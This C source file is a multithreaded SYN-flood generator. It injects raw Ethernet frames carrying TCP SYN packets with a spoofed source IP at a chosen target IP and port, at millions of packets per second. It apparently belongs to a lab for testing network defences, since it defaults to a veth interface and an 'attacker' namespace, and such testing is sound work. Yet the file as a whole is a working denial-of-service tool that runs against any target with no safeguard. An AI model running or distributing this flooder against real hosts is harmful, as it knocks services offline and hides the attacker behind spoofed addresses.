#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <sched.h>
#include <fcntl.h>

#define BATCH_SIZE 512
#define FRAME_SIZE 64

static volatile sig_atomic_t g_running = 1;
static uint64_t g_total_sent = 0;

static void sig_handler(int sig) {
    (void)sig;
    g_running = 0;
}

struct thread_args {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t dst_port;
    int ifindex;
    uint64_t sent;
};

static uint16_t checksum(const void *data, size_t len) {
    const uint16_t *buf = (const uint16_t *)data;
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(const uint8_t *)buf;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static void *worker_loop(void *arg) {
    struct thread_args *t = (struct thread_args *)arg;

    // Use AF_PACKET raw L2 socket to inject Ethernet frames directly into the NIC/veth TX ring,
    // bypassing kernel L3 local routing table and ARP neighbor resolution.
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (fd < 0) {
        perror("socket(AF_PACKET)");
        return NULL;
    }

    int sndbuf = 8 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = t->ifindex;
    sll.sll_halen = ETH_ALEN;
    sll.sll_protocol = htons(ETH_P_IP);
    memset(sll.sll_addr, 0xff, ETH_ALEN);

    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind(AF_PACKET)");
        close(fd);
        return NULL;
    }

    char packet_buf[BATCH_SIZE][FRAME_SIZE];
    struct iovec iov[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];

    const uint16_t ip_tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);

    for (int i = 0; i < BATCH_SIZE; ++i) {
        memset(packet_buf[i], 0, FRAME_SIZE);

        // Layer 2: Ethernet Header (14 bytes)
        struct ethhdr *eth = (struct ethhdr *)packet_buf[i];
        memset(eth->h_dest, 0xff, ETH_ALEN);
        eth->h_source[0] = 0x02;
        eth->h_source[1] = 0x00;
        eth->h_source[2] = 0x00;
        eth->h_source[3] = 0x00;
        eth->h_source[4] = 0x00;
        eth->h_source[5] = 0x02;
        eth->h_proto = htons(ETH_P_IP);

        // Layer 3: IPv4 Header (20 bytes)
        struct iphdr *iph = (struct iphdr *)(packet_buf[i] + sizeof(struct ethhdr));
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(ip_tot_len);
        iph->id = htons(1000 + i);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = t->src_ip;
        iph->daddr = t->dst_ip;
        iph->check = checksum(iph, sizeof(struct iphdr));

        // Layer 4: TCP SYN Header (20 bytes)
        struct tcphdr *tcph = (struct tcphdr *)((char *)iph + sizeof(struct iphdr));
        tcph->source = htons(1024 + (i % 60000));
        tcph->dest = htons(t->dst_port);
        tcph->seq = htonl(100000 + i);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;

        iov[i].iov_base = packet_buf[i];
        iov[i].iov_len = FRAME_SIZE;

        memset(&msgs[i], 0, sizeof(struct mmsghdr));
        msgs[i].msg_hdr.msg_name = &sll;
        msgs[i].msg_hdr.msg_namelen = sizeof(sll);
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    while (g_running) {
        int res = sendmmsg(fd, msgs, BATCH_SIZE, 0);
        if (res > 0) {
            t->sent += res;
        } else if (res < 0 && errno != EAGAIN && errno != EINTR && errno != ENOBUFS) {
            usleep(10);
        }
    }

    close(fd);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_ip> <src_ip_to_spoof> [threads] [interface] [port]\n", argv[0]);
        fprintf(stderr, "Example: sudo %s 198.51.100.1 198.51.100.2 4 veth-gen 80\n", argv[0]);
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    const char *dst_ip_str = argv[1];
    const char *src_ip_str = argv[2];
    int num_threads = (argc >= 4) ? atoi(argv[3]) : 4;
    const char *iface = (argc >= 5) ? argv[4] : "veth-gen";
    uint16_t port = (argc >= 6) ? atoi(argv[5]) : 80;

    if (num_threads < 1) num_threads = 1;
    if (num_threads > 32) num_threads = 32;

    unsigned int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        int ns_fd = open("/var/run/netns/attacker", O_RDONLY);
        if (ns_fd >= 0) {
            if (setns(ns_fd, CLONE_NEWNET) == 0) {
                ifindex = if_nametoindex(iface);
            }
            close(ns_fd);
        }
    }
    if (ifindex == 0) {
        fprintf(stderr, "Error: Interface '%s' not found. Run './tools/setup_veth_lab.sh start' first.\n", iface);
        return 1;
    }

    uint32_t dst_ip = inet_addr(dst_ip_str);
    uint32_t src_ip = inet_addr(src_ip_str);

    printf("====================================================\n");
    printf(" 🚀 L2 Raw Frame Batch Generator (AF_PACKET)\n");
    printf(" Interface   : %s (ifindex %u)\n", iface, ifindex);
    printf(" Target IP   : %s:%d\n", dst_ip_str, port);
    printf(" Source IP   : %s (Simulated Attacker)\n", src_ip_str);
    printf(" Threads     : %d (Batch size: %d frames/syscall)\n", num_threads, BATCH_SIZE);
    printf(" Press Ctrl+C to stop.\n");
    printf("====================================================\n");

    pthread_t threads[32];
    struct thread_args args[32];

    for (int i = 0; i < num_threads; ++i) {
        args[i].src_ip = src_ip;
        args[i].dst_ip = dst_ip;
        args[i].dst_port = port;
        args[i].ifindex = ifindex;
        args[i].sent = 0;
        if (pthread_create(&threads[i], NULL, worker_loop, &args[i]) != 0) {
            perror("pthread_create");
            return 1;
        }
    }

    struct timespec last_ts;
    clock_gettime(CLOCK_MONOTONIC, &last_ts);
    uint64_t last_total = 0;

    while (g_running) {
        sleep(1);
        struct timespec cur_ts;
        clock_gettime(CLOCK_MONOTONIC, &cur_ts);
        double dt = (cur_ts.tv_sec - last_ts.tv_sec) + (cur_ts.tv_nsec - last_ts.tv_nsec) / 1e9;

        uint64_t cur_total = 0;
        for (int i = 0; i < num_threads; ++i) {
            cur_total += args[i].sent;
        }

        double pps = (cur_total - last_total) / dt;
        last_total = cur_total;
        last_ts = cur_ts;
        g_total_sent = cur_total;

        if (pps >= 1000000.0) {
            printf("[GEN] Total: %lu pkts | Rate: \x1b[32m%.2fM pkts/sec\x1b[0m (%.0f PPS)\n", cur_total, pps / 1e6, pps);
        } else {
            printf("[GEN] Total: %lu pkts | Rate: \x1b[33m%.0f pkts/sec\x1b[0m\n", cur_total, pps);
        }
    }

    printf("\nStopping generator threads...\n");
    for (int i = 0; i < num_threads; ++i) {
        pthread_join(threads[i], NULL);
    }

    printf("Done. Total frames injected: %lu\n", g_total_sent);
    return 0;
}
